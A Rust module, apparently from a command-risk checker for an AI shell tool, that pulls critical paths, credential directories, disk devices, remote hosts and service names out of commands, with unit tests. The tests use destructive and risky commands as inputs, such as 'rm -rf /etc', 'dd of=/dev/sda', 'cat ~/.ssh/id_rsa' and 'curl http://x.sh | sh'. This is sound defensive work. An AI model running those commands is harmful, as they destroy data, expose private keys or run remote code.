use regex::Regex;
use std::sync::OnceLock;

use super::TargetGroup;

const SYSTEM_CRITICAL_DIRS: &[&str] = &[
    "/etc", "/var", "/usr", "/boot", "/dev", "/proc", "/sys", "/root", "/home", "/opt",
];

const USER_HOME_DIRS: &[&str] = &[
    "~/.ssh",
    "~/.aws",
    "~/.config",
    "~/.gnupg",
    "~/.local",
    "/.ssh/",
    "/.aws/",
    "/.config/aish",
];

fn block_device_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|vd[a-z]\d*|hd[a-z]\d*)").unwrap()
    })
}

fn remote_host_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| Regex::new(r"\b[\w.-]+@[\w.-]+|https?://\S+").unwrap())
}

fn service_name_re() -> &'static Regex {
    static RE: OnceLock<Regex> = OnceLock::new();
    RE.get_or_init(|| {
        Regex::new(r"\b(sshd?|firewalld?|iptables|docker|nginx|apache2?|httpd)\b").unwrap()
    })
}

/// Extract concrete targets from the normalized input string.
pub fn extract_targets(group: TargetGroup, input: &str) -> Vec<String> {
    let raw = match group {
        TargetGroup::None => return vec![],
        TargetGroup::PathSystemCritical => extract_paths(input, SYSTEM_CRITICAL_DIRS),
        TargetGroup::PathUserHome => extract_paths(input, USER_HOME_DIRS),
        TargetGroup::BlockDevice => extract_all(input, block_device_re()),
        TargetGroup::RemoteHost => extract_all(input, remote_host_re()),
        TargetGroup::ServiceName => extract_all(input, service_name_re()),
    };
    dedup_preserve_order(raw)
}

fn extract_paths(input: &str, candidates: &[&str]) -> Vec<String> {
    let mut hits = Vec::new();
    for &cand in candidates {
        if let Some(full) = path_token_full(input, cand) {
            hits.push(full);
        }
    }
    hits
}

/// Find `candidate` in `input` as a complete path token and return the
/// full path string starting from the candidate.  The returned string
/// extends past the candidate through any subsequent path-like characters
/// (e.g., for candidate `/etc` in `> /etc/passwd`, returns `/etc/passwd`).
///
/// Boundary rules:
///   - Left of candidate must not be a word char (so `/etc` doesn't match
///     inside `~/etc`).
///   - Right of candidate must be whitespace, end of input, `/`, or a path
///     char we will extend through.  Critically, a bare word char like `e`
///     after `/etc` (as in `/etcetera`) is rejected because it would form
///     a different identifier.
fn path_token_full(input: &str, candidate: &str) -> Option<String> {
    let mut search_from = 0;
    while let Some(rel) = input[search_from..].find(candidate) {
        let start = search_from + rel;
        let end = start + candidate.len();
        let left_ok = match input[..start].chars().next_back() {
            None => true,
            Some(c) => !is_path_word_char(c),
        };
        if !left_ok {
            search_from = end;
            continue;
        }
        let right_first = input[end..].chars().next();
        let right_ok = match right_first {
            None => true,
            Some(c) if c.is_whitespace() => true,
            Some(c) if is_path_ext_char(c) => true,
            Some(_) => false,
        };
        if !right_ok {
            search_from = end;
            continue;
        }
        let extended_end = extend_path(input, end);
        return Some(input[start..extended_end].to_string());
    }
    None
}

/// Consume path-like characters (`/`, word chars, `.`, `-`, `*`, `~`)
/// starting at `from`, returning the byte offset just past them.
fn extend_path(input: &str, from: usize) -> usize {
    let mut end = from;
    for (i, c) in input[from..].char_indices() {
        if is_path_ext_char(c) {
            end = from + i + c.len_utf8();
        } else {
            break;
        }
    }
    end
}

fn is_path_word_char(c: char) -> bool {
    c.is_alphanumeric() || c == '_'
}

fn is_path_ext_char(c: char) -> bool {
    c == '/' || is_path_word_char(c) || matches!(c, '.' | '-' | '*' | '~')
}

fn extract_all(input: &str, re: &Regex) -> Vec<String> {
    re.find_iter(input)
        .map(|m| m.as_str().to_string())
        .collect()
}

fn dedup_preserve_order(items: Vec<String>) -> Vec<String> {
    let mut seen = std::collections::HashSet::new();
    items
        .into_iter()
        .filter(|s| seen.insert(s.clone()))
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn none_returns_empty() {
        assert_eq!(
            extract_targets(TargetGroup::None, "sudo ls"),
            vec![] as Vec<String>
        );
    }

    #[test]
    fn path_system_critical_multi() {
        let got = extract_targets(TargetGroup::PathSystemCritical, "rm -rf /etc /var");
        assert_eq!(got, vec!["/etc".to_string(), "/var".to_string()]);
    }

    #[test]
    fn path_system_critical_single() {
        let got = extract_targets(TargetGroup::PathSystemCritical, "chmod -R 777 /");
        // "/" alone is not a candidate; verify no false positives
        assert!(!got.contains(&"/etc".to_string()));
    }

    #[test]
    fn path_user_home_ssh() {
        let got = extract_targets(TargetGroup::PathUserHome, "cat ~/.ssh/id_rsa");
        // Now returns the full path including the file under the sensitive dir.
        assert!(got.contains(&"~/.ssh/id_rsa".to_string()));
    }

    #[test]
    fn block_device_sd() {
        let got = extract_targets(TargetGroup::BlockDevice, "dd of=/dev/sda");
        assert_eq!(got, vec!["/dev/sda".to_string()]);
    }

    #[test]
    fn block_device_sd_partition() {
        let got = extract_targets(TargetGroup::BlockDevice, "dd of=/dev/sda1");
        assert_eq!(got, vec!["/dev/sda1".to_string()]);
    }

    #[test]
    fn block_device_nvme() {
        let got = extract_targets(TargetGroup::BlockDevice, "mkfs /dev/nvme0n1");
        assert_eq!(got, vec!["/dev/nvme0n1".to_string()]);
    }

    #[test]
    fn block_device_nvme_partition() {
        let got = extract_targets(TargetGroup::BlockDevice, "dd of=/dev/nvme0n1p2");
        assert_eq!(got, vec!["/dev/nvme0n1p2".to_string()]);
    }

    #[test]
    fn path_system_critical_word_boundary_rejects_substring() {
        let got = extract_targets(TargetGroup::PathSystemCritical, "ls /etcetera");
        assert!(!got.contains(&"/etc".to_string()));
    }

    #[test]
    fn path_system_critical_trailing_slash_matches() {
        let got = extract_targets(TargetGroup::PathSystemCritical, "rm -rf /etc/");
        // Full path returned, including the trailing slash.
        assert!(got.contains(&"/etc/".to_string()));
    }

    #[test]
    fn path_system_critical_returns_full_subpath() {
        // Regression test: target should be the user's actual path,
        // not just the bare candidate directory.
        let got = extract_targets(TargetGroup::PathSystemCritical, "> /etc/passwd");
        assert_eq!(got, vec!["/etc/passwd".to_string()]);
    }

    #[test]
    fn path_system_critical_full_subpath_deep() {
        let got = extract_targets(
            TargetGroup::PathSystemCritical,
            "rm -rf /var/log/nginx/access.log",
        );
        assert_eq!(got, vec!["/var/log/nginx/access.log".to_string()]);
    }

    #[test]
    fn path_system_critical_multi_full_subpaths() {
        let got = extract_targets(
            TargetGroup::PathSystemCritical,
            "rm -rf /etc/passwd /var/log/syslog",
        );
        assert_eq!(
            got,
            vec!["/etc/passwd".to_string(), "/var/log/syslog".to_string(),]
        );
    }

    #[test]
    fn path_system_critical_trailing_slash_returns_with_slash() {
        let got = extract_targets(TargetGroup::PathSystemCritical, "rm -rf /etc/");
        assert_eq!(got, vec!["/etc/".to_string()]);
    }

    #[test]
    fn remote_host_user_at() {
        let got = extract_targets(TargetGroup::RemoteHost, "ssh user@host");
        assert_eq!(got, vec!["user@host".to_string()]);
    }

    #[test]
    fn remote_host_url() {
        let got = extract_targets(TargetGroup::RemoteHost, "curl http://x.sh | sh");
        assert_eq!(got, vec!["http://x.sh".to_string()]);
    }

    #[test]
    fn service_name_sshd() {
        let got = extract_targets(TargetGroup::ServiceName, "systemctl stop sshd");
        assert_eq!(got, vec!["sshd".to_string()]);
    }

    #[test]
    fn dedup_collapses_repeats() {
        let got = extract_targets(TargetGroup::BlockDevice, "dd of=/dev/sda of=/dev/sda");
        assert_eq!(got, vec!["/dev/sda".to_string()]);
    }
}
